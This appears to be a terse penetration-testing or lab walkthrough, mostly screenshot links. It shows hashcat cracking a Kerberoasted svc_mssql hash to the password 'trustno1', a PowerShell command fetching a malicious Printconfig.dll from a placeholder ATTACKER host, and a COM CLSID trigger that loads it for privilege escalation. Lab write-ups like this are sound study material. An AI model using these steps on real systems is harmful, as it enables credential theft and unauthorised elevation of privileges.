
![Pasted image 20240727222314.png](Evidence/Pasted%20image%2020240727222314.png)

![Pasted image 20240727222420.png](Evidence/Pasted%20image%2020240727222420.png)

```
sudo hashcat -m 13100 svc_mssql.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

![Pasted image 20240727222619.png](Evidence/Pasted%20image%2020240727222619.png)

![Pasted image 20240727222630.png](Evidence/Pasted%20image%2020240727222630.png)

svc_mssql : trustno1

![Pasted image 20240727223834.png](Evidence/Pasted%20image%2020240727223834.png)

![Pasted image 20240727223952.png](Evidence/Pasted%20image%2020240727223952.png)

![Pasted image 20240727224001.png](Evidence/Pasted%20image%2020240727224001.png)

![Pasted image 20240727224015.png](Evidence/Pasted%20image%2020240727224015.png)

![Pasted image 20240727224146.png](Evidence/Pasted%20image%2020240727224146.png)

![Pasted image 20240727224217.png](Evidence/Pasted%20image%2020240727224217.png)

![Pasted image 20240727225259.png](Evidence/Pasted%20image%2020240727225259.png)

![Pasted image 20240727225331.png](Evidence/Pasted%20image%2020240727225331.png)

```
iwr -uri http://ATTACKER:80/Printconfig.dll -Outfile Printconfig.dll
```

![Pasted image 20240727225421.png](Evidence/Pasted%20image%2020240727225421.png)

![Pasted image 20240727225440.png](Evidence/Pasted%20image%2020240727225440.png)

![Pasted image 20240727225636.png](Evidence/Pasted%20image%2020240727225636.png)

**Trigger ->**
```
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
```

```
$object = [Activator]::CreateInstance($type)
```

![Pasted image 20240727225646.png](Evidence/Pasted%20image%2020240727225646.png)

![Pasted image 20240727225741.png](Evidence/Pasted%20image%2020240727225741.png)

